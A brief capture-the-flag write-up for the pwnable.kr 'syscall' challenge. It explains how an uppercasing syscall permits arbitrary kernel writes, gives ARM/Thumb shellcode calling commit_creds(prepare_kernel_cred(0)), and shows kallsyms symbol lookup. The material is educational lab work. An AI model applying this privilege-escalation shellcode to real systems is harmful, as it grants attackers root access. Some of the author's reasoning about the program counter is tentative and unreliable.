# Question

```
ssh syscall@pwnable.kr -p2222
```

# syscall.c

```c
if(in[i]>=0x61 && in[i]<=0x7a){ // a-z
  out[i] = in[i] - 0x20;
}
else{
  out[i] = in[i];
}

```

# Shellcode

```
$ sudo apt install binutils-arm-linux-gnueabi
```

# Solution

`sys_upper` can be used to read or write arbitrary contents.

Each process is represented in the kernel via `task_struct` structure as [this article](https://snyk.io/blog/kernel-privilege-escalation/) says. This structure contains a user's credential. `commit_creds(prepare_kernel_cred(0))` can overwrite this data.

We can call this via the following code (taken from [here](http://alkalinesecurity.com/blog/ctf-writeups/pwnable-challenge-syscall/)):

```
   0:   e28f6001        add     r6, pc, #1
   4:   e12fff16        bx      r6

   0:   b501            push    {r0, lr}
   2:   1a92            subs    r2, r2, r2
   4:   1c10            adds    r0, r2, #0
   6:   46f0            mov     r8, lr
   8:   4a02            ldr     r2, [pc, #8]    ; (14 <.text+0x14>)
   a:   4790            blx     r2

   0:   4a02            ldr     r2, [pc, #8]    ; (c <.text+0xc>)
   2:   321c            adds    r2, #28
   4:   4790            blx     r2
   6:   bd01            pop     {r0, pc}

   8:   f924 8003       vld4.8  {d8-d11}, [r4], r3 ; prepare_kernel_cred
   c:   f550 8003       bpl.w   fff10016 <.text+0xfff10016>
```

The address of a symbol in kernel can be retreived like this:

```
$ cat /proc/kallsyms | grep -n commit_creds
```

The program counter (`pc`) is 32 bits long, so I guess it contains the next address and the next address of the next in thumb-mode. The returned value is stored in r0 and this is used as the first argument of the next call.
